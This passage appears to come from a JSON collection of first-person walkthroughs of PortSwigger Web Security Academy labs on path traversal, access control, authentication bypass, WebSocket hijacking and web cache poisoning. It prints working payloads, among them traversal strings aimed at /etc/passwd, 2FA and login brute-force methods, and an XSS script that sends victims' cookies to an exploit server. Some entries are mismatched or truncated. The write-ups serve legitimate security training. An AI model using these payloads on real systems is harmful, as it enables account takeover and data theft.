"content": "I intercepted a product image request in Burp and changed the \ufb01lename parameter to ..%252f..%252f..%252f/etc/passwd. This value contains double\u2011encoded slashes. The application \ufb01rst checked for ../ and found none because the slashes were hidden. Then it performed a URL\u2011decode, turning %25 into % and leaving %2f. After that, another implicit decode (or the \ufb01le system) turned %2f into /, resulting in ../../../../etc/passwd. The server returned the \ufb01le contents. The app blocks ../ but then does an extra URL\u2011decode, letting double\u2011encoded slashes slip through. Attackers can use this to escape the image folder."}, {"num": "12.5", "difficulty": "PRACTITIONER", "title": "Start-of-path validation bypass", "content": "I intercepted a product image request in Burp and changed the \ufb01lename parameter to /var/www/images/../../../etc/passwd. The application only checks that the path starts with the correct folder (/var/www/images/), so it accepted the request. The server then followed the ../ sequences and returned the contents of /etc/passwd. The app makes the mistake of only checking the beginning of the \ufb01le path. Even though the path starts with the right folder, the ../ after it lets you jump out to other directories."}, {"num": "12.6", "difficulty": "PRACTITIONER", "title": "Null byte extension bypass", "content": "I intercepted a product image request in Burp and changed the \ufb01lename parameter to ../../../etc/passwd%00.png. The application only checks that the \ufb01lename ends with .png, and the %00 (null byte) tricks it into ignoring everything after that. When the server processes the \ufb01le, it sees ../../../etc/passwd and returns its contents. The app only checks that the \ufb01le name ends with .png, but the null byte (%00) tells the system to stop reading there. So the app sees .png and approves it, but the system only reads up to the null byte and opens /etc/passwd instead."}]}, {"num": "13", "title": "Access Control Vulnerabilities", "labs": [{"num": "13.2", "difficulty": "APPRENTICE", "title": "Admin access via unpredictable URL", "content": "This lab features an unprotected admin panel hidden at an unpredictable URL, but the location is disclosed somewhere within the application. To \ufb01nd it, I analyzed the page source using browser developer tools (Inspect) and examined the JavaScript code, where I discovered an endpoint called /admin-kf166p. I navigated to that URL and successfully deleted the user Carlos, completing the lab. This demonstrates how security by obscurity fails as an access control mechanism when hidden admin endpoints are exposed in client-side JavaScript, allowing any user to discover and access unprotected administrative functionality."}, {"num": "13.3", "difficulty": "APPRENTICE", "title": "Role manipulation via request parameter", "content": "This has an admin panel at /admin, which identi\ufb01es administrators using a forgeable cookie parameter. To solve the lab, I \ufb01rst logged in using the provided credentials wiener:peter, then attempted to access the admin panel by navigating to /admin. When access was denied, I opened Burp Suite and intercepted the request, where I noticed a cookie parameter called \"Admin\" set to \"false\". I modi\ufb01ed this value to \"admin=true\" and forwarded the request, which successfully granted me access to the admin panel. From there, I located the option to delete user Carlos and clicked it, but needed to intercept another request to again change the cookie parameter from \"admin=false\" to \"admin=true\" to authorize the deletion. This website rely on user-controllable request parameters for access control that are vulnerable to vertical privilege escalation, while security by obscurity proves equally ineffective since hidden admin paths are often exposed through \ufb01les like robots.txt."}, {"num": "13.4", "difficulty": "APPRENTICE", "title": "Role modi\ufb01cation via user pro\ufb01le", "content": "I logged in with the provided credentials (wiener:peter) and noticed the URL pattern was /my-account?id=wiener. This suggested the application pulls user information based on the id parameter. I tried changing it to \"admin\" thinking I might access another user's account, but it failed . The application properly validated that I can only access my own account. This ruled out simple IDOR. When I tried visiting /admin directly, I received a message that the page is for administrators only. This con\ufb01rmed that there is an admin panel at /admin and The server checks my role/permissions before granting access I returned to the \"My Account\" page and noticed I could add a new email address. I submitted a test email and captured the request in Burp Suite. Looking at the request body, I add \u201croleid\u201d. The application was accepting JSON data. If it accepts an \"email\" parameter, it can maybe accept also the other parameters. This is called parameter injection or mass assignment when an application blindly trusts client-side input and updates multiple \ufb01elds without validation. The application likely stores user data in a database with \ufb01elds like: username, email, password, and roleid. When updating the pro\ufb01le, the server probably takes the JSON, converts it to an object, and updates ALL matching \ufb01elds in the database without \ufb01ltering. From there, I navigated to the admin panel and deleted user carlos."}, {"num": "13.5", "difficulty": "APPRENTICE", "title": "IDOR via request parameter", "content": "I logged in with my own credentials (wiener). On the account page, I noticed the URL followed the pattern /my-account?id=wiener. I changed the id parameter from \"wiener\" to \"carlos\" and sent this request to Burp Repeater. To my surprise, the response came back with a 200 status code, and I could see Carlos's API key displayed on the page. This con\ufb01rmed an Insecure Direct Object Reference (IDOR) vulnerability, where the application failed to verify that I was authorized to access another user's account. This is also known as horizontal privilege escalation, since I accessed an account at the same privilege level (another standard user) without having the right permissions."}, {"num": "13.6", "difficulty": "APPRENTICE", "title": "IDOR with unpredictable user IDs", "content": "This is a horizontal privilege escalation vulnerability, which occurs when a user gains access to data or functionality belonging to another user with the same role. On this blog, the user carlos and wiener is a same user/same access role. I start to click the blogs, and \ufb01nd the username Carlos.The burpsuite intercept was on, I click on Carlos to get more information and by observing it, the URL gave me the Carlos userID.(save it) After logging in using the provided credentials wiener:peter, Burp Suite captured the HTTP request for my account page containing my own userID. I simply replaced my userID parameter with Carlos's saved userID and forwarded the request. By just changing the userID,i can successfully login as carlose and see his personal API key. This is an Insecure Direct Object Reference (IDOR) vulnerability, which arises when an application uses user-controllable parameter values to directly access resources or functions without proper authorization checks. The \ufb02aw exists because the server trusts the user-supplied ID and fails to verify whether the authenticated user actually has permission to access the requested resource, allowing horizontal privilege escalation where a user can access data belonging to another user with the same role."}, {"num": "13.7", "difficulty": "APPRENTICE", "title": "IDOR with data leakage in redirect", "content": "This demonstrates an IDOR vulnerability where sensitive data is exposed during a redirect. I logged in with my credentials (wiener) and captured the account page request in Burp Suite. In Repeater, I modi\ufb01ed the id parameter from \"wiener\" to \"carlos\". Although the server responded with a redirect, the API key for user Carlos was still visible in the response body before the redirect executed. This is a classic case of data leakage wher the server leaks sensitive information even when it intends to redirect unauthorized users."}, {"num": "13.8", "difficulty": "APPRENTICE", "title": "IDOR with password disclosure", "content": "This has an a IDOR vulnerability that leads to password disclosure, allowing privilege escalation from a standard user to administrator. After logging in with the provided credentials, I used Burp Suite to analyze the account update functionality. By manipulating the request parameters, I changed the \"wiener\" parameter to \"administrator\" in the request, which tricked the application into revealing the administrator's password hash or password data in the response. I saved the captured administrator password and logged back into the application using these new credentials. With administrative access granted, I navigated to the admin panel and successfully deleted the user Carlos, completing the lab. This vulnerability occurs because the application does not check whether the logged-in user is authorized to access another user's data, allowing an attacker to simply change a parameter from \"wiener\" to \"administrator\" and directly retrieve the administrator's password through insecure direct object reference."}, {"num": "13.9", "difficulty": "APPRENTICE", "title": "Insecure direct object reference", "content": "This lab stores user chat logs directly on the server's \ufb01le system and retrieves them using static URLs. When I visited the live chat page, I sent some test messages, but nothing useful appeared initially. However, when I clicked the \"View Transcript\" button, it downloaded a .txt \ufb01le containing the conversation I just had with the bot. I couldn't manipulate parameters directly in the browser URL, so I captured the transcript download request in Burp Suite and sent it to Repeater. I modi\ufb01ed the \ufb01lename from the original to \"../1.txt\" (or simply tried \"1.txt\") The response contained Carlos's password! With this password, I was able to log in as Carlos and complete the lab. The server wasn't properly validating \ufb01le paths, allowing me to traverse or navigate directories and access other users' chat logs."}, {"num": "13.10", "difficulty": "PRACTITIONER", "title": "URL-based access control bypass", "content": "The application has an admin panel at /admin, but a front-end system blocks direct external access to that path. However, the back\u2011 end framework supports the X-Original-URL header, which lets us bypass the front\u2011 end restriction by hiding the real path in that header. The /admin was forbidden and then i add a X-Original-URL: /invalid. The back\u2011 end returned a \u201cnot found\u201d response, confirming it was reading the path from the header. I then set X-Original-URL: /admin and received the admin panel."}, {"num": "13.11", "difficulty": "PRACTITIONER", "title": "Method-based access control bypass", "content": "I \ufb01rst logged in as administrator:admin to access the admin panel. From there, I upgrade Carlos and captured that request in Burp Repeater. Then I opened a private browser window and logged in as wiener:peter. I copied wiener's session cookie and pasted it into the existing Repeater request, then sent it. The response said \"Unauthorized,\" as expected. I right-clicked and selected \"Change request method\" to convert it to GET. Then I changed the username parameter carlos to wiener and sent the request again. This time it worked, and I successfully promoted myself to administrator. The vulnerability here is that the server only checks access rights on POST requests, but not on GET requests. So by changing the method to GET, I bypassed the access control entirely."}, {"num": "13.12", "difficulty": "PRACTITIONER", "title": "Missing access control in multi-step process", "content": "I \ufb01rst logged in as administrator:admin and went through the process of upgrading Carlos to administrator. During this multi-step process, I noticed there were two POST requests , one for the initial action and another for con\ufb01rmation. I captured both requests and sent them to Burp Repeater. The 2 POST request\u2019s : Next, I opened a private browser window and logged in as wiener:peter. I used the Inspector in Burp to copy wiener's session cookie value. Then I went back to my Repeater requests, replaced the original session cookie with wiener's cookie, and changed the username parameter from carlos to wiener. When I replayed both requests, the promotion went through successfully, and wiener became an administrator. The \ufb02aw here is that the multi-step process only checks access rights on the \ufb01rst request, but not on the con\ufb01rmation step. Even though I was logged in as a normal user, I could reuse the admin's con\ufb01rmation request by simply swapping the session cookie and username."}, {"num": "13.13", "difficulty": "PRACTITIONER", "title": "Referer-based access control bypass", "content": "I \ufb01rst logged in as administrator:admin and went to the admin panel to upgrade Carlos. When I clicked the upgrade action, I captured the GET request in Burp Repeater. Looking at it, I noticed the endpoint was something like /admin-roles?username=carlos&action=upgrade. I copied wiener's session cookie from the private browser and pasted it into my existing Repeater request. I changed the username from carlos to wiener but made sure to keep the Referer ID because without it,the request will be blocked meaning the application was using the Referer ID to decide who could access admin functions. When I sent the request, it worked perfectly and promoted me to administrator. The vulnerability here is that the application trusts the Referer header as proof of authorization. But the Referer is just a suggestion sent by the browser , it can be easily faked or copied. Attackers can take a valid request from an admin session and replay it with their own cookies and the same Referer."}]}, {"num": "14", "title": "Authentication", "labs": [{"num": "14.2", "difficulty": "APPRENTICE", "title": "Simple 2FA bypass", "content": "I logged into my own account, where the 2FA veri\ufb01cation code was sent via email. I clicked the Email client button to view the code but took no further action on that page. Instead, I noted the URL of my account page at /my-account, logged out, and returned to the homepage. Next, I logged in using the victim's credentials. When prompted for the veri\ufb01cation code at /login2, I manually changed the URL in the browser to navigate directly to /my-account. The page loaded successfully, granting me full access to the victim's account without entering the 2FA code, which solved the lab. This is a broken access control / 2FA bypass vulnerability, It occurs because the application only enforced two-factor authentication at the login step but failed to verify that the user had actually completed it before granting access to subsequent pages, allowing attackers to bypass 2FA entirely by directly requesting authenticated endpoints."}, {"num": "14.3", "difficulty": "APPRENTICE", "title": "Broken password reset logic", "content": "This lab had a vulnerable password reset functionality. I started by turning on Burp Suite intercept and navigating to the login page. Using my own credentials (wiener), I clicked the \"Forgot Password\" option. After submitting the password reset request, I clicked the email client button to view the reset email that was sent. The email contained a unique reset link. When I clicked this link, Burp Suite (with intercept still on) captured the request. I went to the HTTP history in the Proxy tab and found the POST request generated when I clicked the reset link. The request looked like this: /forgot-password?temp-forgot-password-token=xyz123. Inside the request body, there was also a hidden input \ufb01eld containing my username (wiener). I sent this request to Burp Repeater for further analysis. While examining the password reset functionality, I noticed that the request contained the temporary token parameter in the URL and also referenced the username elsewhere in the request. I removed the token parameter and other non-essential elements, then changed the username from \"wiener\" to my victim \"Carlos\". The request still worked .This con\ufb01rmed the broken password reset logic: the application only checked that a reset request was made, but didn't properly validate that the token matched the user."}, {"num": "14.4", "difficulty": "PRACTITIONER", "title": "Subtle username enumeration", "content": "I started by capturing a login request in Burp and sent it to Intruder. I set the username as the payload position and loaded the candidate username list. With the username identi\ufb01ed, I set up another Intruder attack, this time putting the payload position on the password parameter. I loaded the candidate password list and ran the attack. Looking at the response lengths, one stood out with a value of 190 while all others were around 3444+. That shorter response meant a successful login. I took that password, logged in with the username I found, and completed the lab. The vulnerability here is that the server responds slightly differently when a username is valid versus invalid in this case."}, {"num": "14.5", "difficulty": "PRACTITIONER", "title": "Timing-based username enumeration", "content": "I started by testing the login form and noticed that after too many failed attempts, my IP got blocked. However, I discovered that the application supports the X-Forwarded-For header, which lets me spoof a different IP address with each request and bypass the block. This was crucial for the attack. While experimenting, I observed an interesting pattern: when I entered an invalid username, the response time was consistently fast. But when I used a valid username (like my own wiener) and a very long password (around 100 characters), the response time increased noticeably. This happened because the server spent extra time hashing the long password only after con\ufb01rming the username was valid. (The picture:) To exploit this, I set up a Pitchfork attack in Burp Intruder. Pitchfork is useful here because it takes pairs of payloads from two lists and uses them together in each request. I added two payload positions: one for the X-Forwarded-For header (spoo\ufb01ng IPs) and one for the username. For the password, I used a \ufb01xed long string. I set the \ufb01rst payload to a range of numbers (1\u2011106) to generate unique IPs, and the second payload to the list of candidate usernames. By sending each username with a different spoofed IP, I avoided triggering the block. After the attack, I sorted the results by response time. One username stood out with a signi\ufb01cantly longer response time than the others and this was my valid username. This time I kept the username \ufb01xed and added a payload position to the password \ufb01eld, using the list of candidate passwords. I ran the attack and looked for a response with a 302 status code, which indicates a successful login redirect. That response gave me the correct password. After getting the correct credentials, Go to the burp then change the X-forward-for then send it to have a new fresh requests and to avoid the lock account 30 minutes. Right click the response and copy URLl but \ufb01rst please intercept on then paste it to our browser. Now, time to test a random credentials which is the wrong ones. Then send the POST request that we will be getting by that to the repeater, correct the wrong credentials and add X-forward header and send & follow redirection then lastly intercept off. The vulnerability arises because the server takes more time to process a login attempt when the username is valid, due to the extra work of hashing a long password. This timing difference leaks information to attackers, allowing them to enumerate valid usernames."}, {"num": "14.6", "difficulty": "PRACTITIONER", "title": "Broken brute-force protection with IP blocking", "content": "I started by investigating the login page and noticed that after three failed attempts, my IP gets temporarily blocked. But I discovered a \ufb02aw: if I log in successfully with my own account (wiener:peter) before hitting the limit, the counter resets. This meant I could interleave login attempts for the victim carlos with my own valid logins to avoid being blocked. To automate this, I created a Python script that generates a sequence of usernames and corresponding passwords. The pattern alternates so that every third attempt is my valid login (wiener with password peter), and the other two are for carlos with passwords from a wordlist. This way, after every two guesses for Carlos, I send a correct login for myself to reset the counter. I then set up a Pitchfork attack in Burp Intruder with payload positions for both username and password. I con\ufb01gured a resource pool with maximum concurrent requests set to 1 to ensure the requests are sent in the exact order I generated. For the \ufb01rst payload (username), I used the list from my script that alternates between wiener and carlos. For the second payload (password), I used the corresponding list where peter aligns with wiener and candidate passwords align with carlos. After running the attack, I \ufb01ltered out the 200 responses (failed logins) and looked for a 302 redirect. Only one request for carlos returned a 302, revealing his correct password. I then logged in as Carlos and accessed his account page to solve the lab. The vulnerability is that the brute-force protection counter resets after a successful login, allowing attackers to bypass the block by interleaving their own valid credentials."}, {"num": "14.7", "difficulty": "PRACTITIONER", "title": "Enumeration via account lock behavior", "content": "I started by capturing a login request in Burp and sent it to Intruder to brute-force usernames. I noticed that after too many failed attempts, the account would lock or show a different error message. This gave me an idea: I could use the lockout behavior to identify valid usernames. For the \ufb01rst attack, I used a Cluster bomb because I needed to test each username multiple times to trigger the lockout. I set up two payload positions: one for the username and another blank one at the end of the password parameter, like this: `username=\u00a7carlos\u00a7&password=test\u00a7\u00a7`. For the \ufb01rst position, I loaded the list of candidate usernames. For the second position, I selected Null payloads and set it to generate 5 payloads. This meant each username would be tried 5 times in a row, simulating repeated failed attempts. After running the attack, I looked at the responses and noticed one username stood out with a different response length. When I checked the actual response text, instead of the usual \"Invalid username or password\" message, it said: \"You have made too many incorrect login attempts. Please try again.\" This was the hint I needed this username was valid because the server actually locked the account after multiple failures. The invalid usernames never triggered a lockout, so they kept showing the standard error. The valid username was `athena` (or whatever the speci\ufb01c one was). Now that I had the username, I set up a second Intruder attack. This time I used a Sniper attack with the username \ufb01xed to `athena` and a payload position on the password parameter. I loaded the list of candidate passwords and added a grep extraction rule to capture the error message from each response. After running the attack, I scanned the results and found one response that had no error message at all or no red text, no popup, just a successful login redirect. That was my valid password. The vulnerability here is how the application handles account lockouts. Valid usernames eventually trigger a lockout message after multiple failures, while invalid ones never do. This subtle difference lets attackers enumerate valid usernames just by observing when the error message changes."}, {"num": "14.8", "difficulty": "PRACTITIONER", "title": "Broken 2FA logic", "content": "I started by logging into my own account (wiener:peter) and went through the two-factor authentication process. While doing so, I captured two important requests in Burp: a GET /login2 and a POST /login2. I sent both to Repeater for further testing. I noticed that the verify parameter in both requests determines which user's account is being accessed. So \ufb01rst, I modi\ufb01ed the GET /login2 request by changing the verify parameter from wiener to carlos and remove the cookie session then sent it. This forced the server to generate a temporary 2FA code for Carlos. On the POST /login2 request. In this request, I again changed the verify parameter to carlos and removed the session cookie. I then sent this request to Intruder and set up a sniper attack on the mfa-code parameter, brute\u2011forcing all possible 4\u2011digit codes. After the attack \ufb01nished, I found a request that returned a 302 redirect ,that was the valid code. I loaded that response in my browser, which gave me a valid session for Carlos. I then went to the browser, added the session cookie from that response (via Inspect > Cookies), and visited the \"My account\" page. I was logged in as Carlos, solving the lab. The vulnerability of this app lets you tell it which user to verify, like putting carlos in the verify box. Even if you're logged in as someone else, the app still generates and checks codes for Carlos. That means you can ask for a code for Carlos, then try all possible codes until one works."}, {"num": "14.9", "difficulty": "PRACTITIONER", "title": "Brute-forcing persistent login cookie", "content": "I logged into my account using the credentials wiener:peter and made sure to check the \"Stay logged in\" box. This added a stay-logged-in=on parameter in the POST request and set a cookie in the response. In Burp, I examined the cookie and noticed it was a Base64-encoded string. After decoding it, I saw wiener:51dc30ddc473d43a6011e9ebba6ca770. The second part looked like an MD5 hash, and sure enough, hashing my password peter with MD5 produced the same value. So the cookie format was: base64(username + \":\" + md5(password)). Next, Find a GET /my-account?id=wiener request in Burp's HTTP history. I sent this request to Intruder. I removed the id=wiener from the URL and also removed the session cookie, leaving only the stay-logged-in cookie as a payload position. I set up a list of candidate passwords as the payload. These are the three rules under the Payload Processing : 1) Hash:MD5 to convert the paintext into MD5 hash, 2) Add pre\ufb01x:carlos: to prepend the username & colon and lastly is Encode:Base64 to turn the whole string into \ufb01nal cookie format. The \ufb02aw is that the \"stay logged in\" cookie is simply a predictable combination of username and MD5 hash of the password, with no expiration or randomness. Attackers can easily decode the cookie, reverse\u2011engineer the format, and brute\u2011force the password o\ufb04ine."}, {"num": "14.10", "difficulty": "PRACTITIONER", "title": "O\ufb04ine password cracking", "content": "I started by logging into my own account (wiener:peter) and captured the POST /login request. In the response, I found the stay-logged-in cookie. I sent it to Burp Decoder and saw it was Base64-encoded. After decoding, it revealed the format username:md5(password). The password part was an MD5 hash, so I used CrackStation (a tool that uses rainbow tables) to reverse it and con\ufb01rm my own password. This told me exactly how the cookie was built. Next, I went to a blog post and tested the comment section for XSS. I posted a simple <script>alert(1)</script> comment, and when I reloaded the page, the alert popped up. So comments were vulnerable. Now I needed to steal Carlos's cookie. I set up an exploit server and copied its URL. Then I posted a new comment with this payload: <script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cooki e</script>. This forces anyone viewing the comment to send their cookies to my exploit server. I went back to the exploit server and checked the access logs. Soon I saw two GET requests: one to the exploit server itself and one containing stay-logged-in= with a cookie. That second request was the one I needed. I copied Carlos's cookie and decoded it in Burp, which gave me carlos:26323c16d5f4dabff3bb136f2460a943. I ran the hash through CrackStation again and it returned the password onceuponatime. Finally, I logged into Carlos's account using those credentials, went to his account page, and deleted it to solve the lab. The vulnerability here is when stay logged in cookie stores a password hash that can be cracked o\ufb04ine and XSS \ufb02aw lets the attackers to steal it."}, {"num": "14.11", "difficulty": "PRACTITIONER", "title": "Password reset poisoning via middleware", "content": "I started by investigating the password reset functionality. When I requested a reset for my own account (wiener:peter), the application sent an email containing a unique reset link. I captured the POST /forgot-password request in Burp Repeater. While testing the request, I discovered that the server supports the X-Forwarded-Host header. This header is normally used by proxies to tell the server what hostname the client originally requested. By adding this header, I could make the dynamically generated reset link point to any domain I wanted. Go to exploit server and here we will be seeing this token link. It would direct as on new page where we can change our New password. The most important step here was: I added the X-Forwarded-Host header with my exploit server URL, changed the username parameter to carlos, and sent the request. This tricked the server into generating a password reset link for Carlos that pointed to my exploit server instead of the legitimate site. I then went to my exploit server's access log and saw a GET /forgot-password request containing Carlos's reset token as a query parameter. I copied that token. Next, I pasted it into my burpsuite repeater requests as show on the pictures and then click send. Ensure that when changing the password, the 2 must be matched for the con\ufb01rmation. The vulnerability here is that the application asked \"Where should I send this reset link?\" and let anyone answer by using the X-Forwarded-Host header .The app uses something called X-Forwarded-Host to decide what web address to put in that link. And it trusts whatever you tell it. I told it \"Send it to MY server,\" and it did. When Carlos clicked the link, his secret token came straight to me. Just like a restaurant that lets strangers redirect someone else's food delivery, the app should never trust outsiders to change where important things are sent."}, {"num": "14.12", "difficulty": "PRACTITIONER", "title": "Password brute-force via change function", "content": "I logged into my account (wiener:peter) and played around with the password change feature. I noticed something interesting: when I entered the wrong current password but made the two new passwords match, the account got locked. But if I entered the wrong current password and made the two new passwords different, I just got a simple error saying \"Current password is incorrect.\" However, when I entered the correct current password but two different new passwords, the error changed to \"New passwords do not match.\" This was the key. The app was giving away clues through different error messages. If I guessed a password correctly but used mismatched new passwords, the \"New passwords do not match\" message would tell me I got the current password right. I sent the POST /my-account/change-password request to Burp Intruder. I changed the username parameter to carlos and set a payload position on the current-password \ufb01eld. I made sure the two new password \ufb01elds were set to different values. This way, a correct guess would trigger the \"New passwords do not match\" message instead of locking the account. I loaded the candidate password list as the payload. After running the attack, only one response had that message \u201cNew passwords are not match\u201d and that was Carlos's correct password. I logged out of my account, logged back in as carlos with that password, and accessed his \"My account\" page to solve the lab. The vulnerability here is that the password change feature reveals different error messages depending on whether the current password is correct or not."}, {"num": "14.13", "difficulty": "EXPERT", "title": "Multi-credential brute-force bypass", "content": "I started by investigating the login page and noticed that the POST /login request sends credentials in JSON format like this {\u201cusername then the password\u201d}. Sent this request to Burp Repeater. The key insight was that the server accepts an array of passwords in the JSON. So instead of trying one password per request, I could send all candidate passwords at once. Doing this manually would be tedious, so I wrote a small Python script to format the password list into a JSON array: I copied the output and pasted it into the Repeater request, replacing the single password value. Then I sent the request and got back a 302 response. The copy the session cookie and paste it to the website using the inspect tool. The app counted each request as one try, not each password. By sending an array of 100 passwords in one request, I made 100 guesses but only triggered one \"attempt.\" To \ufb01x it, count each password attempt separately and reject arrays, passwords should always be single strings."}, {"num": "14.14", "difficulty": "EXPERT", "title": "2FA brute-force bypass", "content": "I started by logging in as carlos:montoya and went through the two-factor authentication process. I noticed that if I entered the wrong code twice, the application logged me out completely. This meant I couldn't just brute\u2011force the 2FA code directly. I needed a way to automatically log back in after every two failed attempts. To solve this, I used Burp's session handling rules with a macro. A macro is like a recorded sequence of steps that Burp can replay automatically. Go to scope then click Include all URLs. The next steps on the Rule Actions click \u201cAdd\u201d and I created a macro that performed three requests in order: GET /login for load the login page, POST /login for submitting Carlos's credentials and GET /login2 to get the 2FA page again. I con\ufb01gured this macro to run before each request sent by Intruder. This way, after every two failed guesses (which would log me out), the macro would log me back in, and Intruder could continue brute\u2011forcing without interruption. Next, I sent the POST /login2 request to Intruder and added a payload position on the mfa-code parameter. I set the payload type to Brute forcer with characters 0\u20119 and min/max length 4, generating all possible 4\u2011digit codes. I also created a resource pool with Maximum concurrent requests set to 1 to ensure requests were sent one at a time, respecting the login/logout cycle. I started the attack and waited. Eventually, one request returned a 302 status code - that was the valid 2FA code. I right\u2011clicked that request, selected \"Show response in browser\", copied the URL, and pasted it into my browser. This gave me access to Carlos's account page, solving the lab. The vulnerability here is that the 2FA code is only 4 digits, making it easy to brute\u2011force. Although the app logs you out after two failed attempts, this protection is weak because you can simply log in again. The macro automates(like a robot) that re\u2011login process: it replays the login steps before each new guess, allowing the brute\u2011force attack to continue uninterrupted. To prevent this, use longer codes (6+ digits) and rate limiting that blocks further attempts regardless of re\u2011login, or tie the 2FA session more tightly to prevent automated resets."}]}, {"num": "15", "title": "WebSockets", "labs": [{"num": "15.2", "difficulty": "PRACTITIONER", "title": "Cross-site WebSocket hijacking", "content": "I need to steal the victim's chat history by exploiting a cross-site WebSocket hijacking vulnerability, then use the captured credentials to access their account. I started by opening the live chat feature and sending a test message, then reloaded the page. While monitoring Burp Proxy, I noticed something interesting in the WebSockets history tab: when the page reloaded, the client automatically sent a \"READY\" command through the WebSocket, which instructed the server to resend all past chat messages. This meant that if I could force a victim's browser to connect to this WebSocket, I could receive their entire chat history. I then checked the HTTP history tab and found the WebSocket handshake request. The key observation was that this request contained no CSRF tokens or other anti-CSRF protections, making it vulnerable to cross-site attacks. I copied the WebSocket URL, making sure to change it from https:// to wss:// for the secure WebSocket protocol. Next, I went to the exploit server and crafted a malicious HTML payload. The script created a new WebSocket connection to the vulnerable chat endpoint. When the connection opened, it automatically sent the \"READY\" command to retrieve the chat history. Once the messages were received, the script forwarded them to my Burp Collaborator server . I used Burp Decoder to decode the interesting string I found, because one of the HTTP requests in Collaborator indicated that a certain user had forgotten their password. After successfully decoding the password, I used it to log in as Carlos, our target user. The vulnerability exists because the server blindly trusts that any request with a valid session cookie must come from the user's intention. In this lab, I tricked the victim's browser into opening a WebSocket connection to the chat feature without their knowledge. The browser automatically attached their session cookie, so the server accepted the connection thinking it was the victim."}, {"num": "15.3", "difficulty": "PRACTITIONER", "title": "Manipulating WebSocket handshake", "content": "The live chat uses WebSockets with an XSS \ufb01lter that blocks malicious messages and bans the sender\u2019s IP. By spoo\ufb01ng the IP address during the WebSocket handshake, we can bypass the ban and send an obfuscated payload that evades the \ufb01lter. I opened the live chat and sent a normal message. In Burp\u2019s WebSockets history, I tried sending a basic XSS payload <img src=1 onerror='alert(1)'> but the connection was terminated and my IP was banned. I attempted to reconnect, but the server refused. I added the header X-Forwarded-For: 1.1.1.1 to the WebSocket handshake request, which tricked the server into thinking my IP was different, allowing me to reconnect. I then sent an obfuscated payload: <img src=1 oNeRrOr=alert1>."}]}, {"num": "16", "title": "Web Cache Poisoning", "labs": [{"num": "16.2", "difficulty": "PRACTITIONER", "title": "Unkeyed cookie poisoning", "content": "The home page re\ufb02ects the value of the fehost cookie inside a JavaScript object in the response. Cookies are not part of the cache key, meaning different cookie values can produce cached responses that get served to other users. Attack surface is the fehost cookie and the cache behavior. I loaded the home page and noticed the response set a fehost cookie that was re\ufb02ected in a JavaScript object. I sent the request to Repeater and added a cache buster. Changing the cookie value con\ufb01rmed re\ufb02ection. I injected an XSS payload: fehost=someString\"-alert(1)-\"someString. I replayed the request until the response showed my payload and X-Cache: hit. I loaded the page in the browser and the alert \ufb01red. I removed the cache buster and replayed the request to keep the cache poisoned. When the victim visited the home page, they received the cached response and the alert executed, solving the lab."}, {"num": "16.3", "difficulty": "PRACTITIONER", "title": "Multi-header poisoning", "content": "The tracking.js JavaScript \ufb01le is cached and its response can be manipulated using the X-Forwarded-Scheme and X-Forwarded-Host headers. The X-Forwarded-Scheme header triggers a redirect when set to anything other than HTTPS, and the Location header of that redirect uses the X-Forwarded-Host value. I requested /resources/js/tracking.js and tested the X-Forwarded-Host header alone with no effect. Adding X-Forwarded-Scheme with a non HTTPS value returned a 302 redirect to the same URL using HTTPS. Combining both headers made the Location header point to the X-Forwarded-Host domain. Add cache-buster for our testing endpoint. I hosted a malicious script on my exploit server at the same /resources/js/tracking.js path containing alert(document.cookie). I sent the request with X-Forwarded-Scheme nothttps and X-Forwarded-Host set to my exploit server until the response showed X-Cache hit. I removed the cache buster and replayed to keep the cache poisoned. When the victim loaded the home page, they received the cached redirect and executed my payload, solving the lab."}, {"num": "16.4", "difficulty": "PRACTITIONER", "title": "Targeted poisoning via unknown header", "content": "The home page response dynamically generates an absolute URL for importing tracking.js using the value of the X-Host header, which Param Miner discovered as a hidden input. The Vary header indicates User-Agent is part of the cache key, meaning cached responses are served only to users with matching User-Agent strings. I used Param Miner to guess headers on the home page request and it identi\ufb01ed X-Host as a hidden header. Testing in Repeater showed the X-Host value was used to construct the URL for tracking.js. I hosted a malicious script on my exploit server at /resources/js/tracking.js containing alert(document.cookie). Go to homepage and any posts, comment this img script with your exploit lab id. Then go to exploit server logs and copy the victim User Agent and paste it to the repeater. I added that User-Agent to my poisoned request, removed the cache buster, and replayed until the cache held the response for that speci\ufb01c user agent. When the victim visited, they received the poisoned response and the alert \ufb01red, solving the lab. The vulnerability exists because the X-Host header in\ufb02uences the response but isn't part of the cache key, while the Vary header makes poisoning targeted by User-Agent."}, {"num": "16.5", "difficulty": "PRACTITIONER", "title": "Unkeyed query string poisoning", "content": "Go to homepage, Send to the repeater. This page is potential cache oracle as we can see in the response.I loaded the home page and sent the request to Repeater. Adding arbitrary query parameters still returned cache hits, con\ufb01rming the query string is unkeyed. I used the Origin header as a cache buster and injected a parameter containing evil'/><script>alert(1)</script>. When the response showed my payload and X-Cache hit, I removed the query string and sent the request again, con\ufb01rming the cached response still contained the payload. When the victim visited the home page, they received the poisoned response and the alert \ufb01red, solving the lab. The vulnerability exists because the query string in\ufb02uences the response but isn't included in the cache key, letting attackers poison the cache with malicious content that gets served to users making requests without those parameters."}, {"num": "16.6", "difficulty": "PRACTITIONER", "title": "Unkeyed query parameter poisoning", "content": "16.7 PRACTITIONER - Parameter cloaking This lab demonstrates web cache poisoning via parameter cloaking. The cache and the back-end server parse parameters inconsistently: the cache treats a semicolon as part of a single parameter value, while the back-end uses it to separate multiple parameters. This allows an attacker to inject a hidden parameter that affects the response but is excluded from the cache key, poisoning the cached page for other users. First, I identi\ufb01ed that the utm_content parameter is supported by the application and is not included in the cache key. By appending another parameter to it using a semicolon, like utm_content=foo;callback=malicious, the cache sees only one parameter (utm_content) and ignores the appended part, but the back-end processes both. The target was the script /js/geolocate.js, which uses a callback parameter to dynamically generate a JavaScript function call. Normally, the callback parameter is keyed, so poisoning it directly would not affect other users. However, by cloaking the second callback inside the unkeyed utm_content parameter, I could control the function name without altering the cache key. The cache stored the response using only the \ufb01rst callback value in its key, while the back-end executed the second one. After the response was cached, any visitor to a page that imports this script would receive the poisoned version, triggering alert(1). The core issue is inconsistent parameter parsing between the cache and the origin server."}, {"num": "16.8", "difficulty": "PRACTITIONER", "title": "Fat GET request poisoning", "content": "callback=alert(1)"}, {"num": "16.9", "difficulty": "PRACTITIONER", "title": "URL normalization exploitation", "content": "I use this URL to send to the victim: \u201chttps://labid/%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73 %63%72%69%70%74%3e\u201d"}, {"num": "16.10", "difficulty": "EXPERT", "title": "Poisoning to exploit DOM vulnerability", 